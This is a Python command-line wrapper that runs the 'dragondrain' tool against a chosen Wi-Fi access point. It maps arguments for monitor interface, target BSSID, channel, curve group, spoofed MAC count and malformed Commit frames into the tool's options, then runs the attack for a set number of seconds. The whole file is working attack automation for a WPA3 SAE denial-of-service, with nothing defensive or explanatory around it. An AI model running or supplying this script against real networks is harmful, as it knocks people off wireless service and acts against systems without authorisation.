#!/usr/bin/env python3
import argparse
import subprocess
import sys
import shutil

def parse_args():
    parser = argparse.ArgumentParser(
        description="Python wrapper for dragondrain attack tool."
    )

    # Custom parameters
    parser.add_argument('-i', '--iface', required=True,
                        help="Monitor-mode interface")
    parser.add_argument('-b', '--bssid', required=True,
                        help="BSSID of the target AP")
    parser.add_argument('-c', '--current-channel', required=True,
                        help="Current channel of the target AP")
    parser.add_argument('-g', '--group', default='19',
                        help="The curve group to use (19 or 21)")
    parser.add_argument('-d', '--debug-level', type=int, default=1,
                        help="Debug level (0 to 3; default: 1)")
    parser.add_argument('-r', '--rate', type=float, default=1.0,
                        help="Bitrate of injected frames (e.g., 1, 6, 12, 24, 48, 54)")
    parser.add_argument('-n', '--number-of-mac', type=int, default=20,
                        help="Number of spoofed MAC addresses (default: 20)")
    parser.add_argument('-mf', '--malformed-frames', action='store_true',
                        help="Inject a malformed Commit after every spoofed one")
    parser.add_argument('-t', '--time', type=int, default=30,
                        help="Duration of the attack (in seconds)")

    return parser.parse_args()


def find_executable():
    """
    Locate the dragondrain executable in the system PATH.
    """
    exe = shutil.which('dragondrain')
    if exe:
        return exe
    sys.exit("Error: 'dragondrain' executable not found in PATH. Please install it or add it to PATH.")


def build_dragondrain_command(executable, args):
    """
    Build the dragondrain command by mapping the custom parameters to corresponding options.
    """
    cmd = [executable]
    cmd.extend(['-d', args.iface])                 # Monitor-mode interface -> -d
    cmd.extend(['-a', args.bssid])                  # Target AP BSSID -> -a
    cmd.extend(['-c', args.current_channel])        # Current channel -> -c
    cmd.extend(['-b', str(args.rate)])              # Bitrate -> -b
    cmd.extend(['-n', str(args.number_of_mac)])     # Number of spoofed MAC addresses -> -n
    cmd.extend(['-g', args.group])                  # Curve group -> -g
    cmd.extend(['-v', str(args.debug_level)])       # Debug level -> -v

    if args.malformed_frames:
        cmd.append('-m')                             # Malformed commit flag -> -m

    return cmd


def run_dragondrain(cmd, duration):
    """
    Execute dragondrain as a subprocess and limit execution time.
    """
    print("Executing command:")
    print(" ".join(cmd))

    proc = subprocess.Popen(cmd)
    try:
        proc.wait(timeout=duration)
    except subprocess.TimeoutExpired:
        print(f"Attack duration of {duration} seconds expired. Terminating dragondrain...")
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
    except KeyboardInterrupt:
        print("Keyboard interrupt detected. Terminating dragondrain...")
        proc.terminate()
        sys.exit(0)


def main():
    args = parse_args()
    exe_path = find_executable()
    cmd = build_dragondrain_command(exe_path, args)
    run_dragondrain(cmd, args.time)


if __name__ == "__main__":
    main()
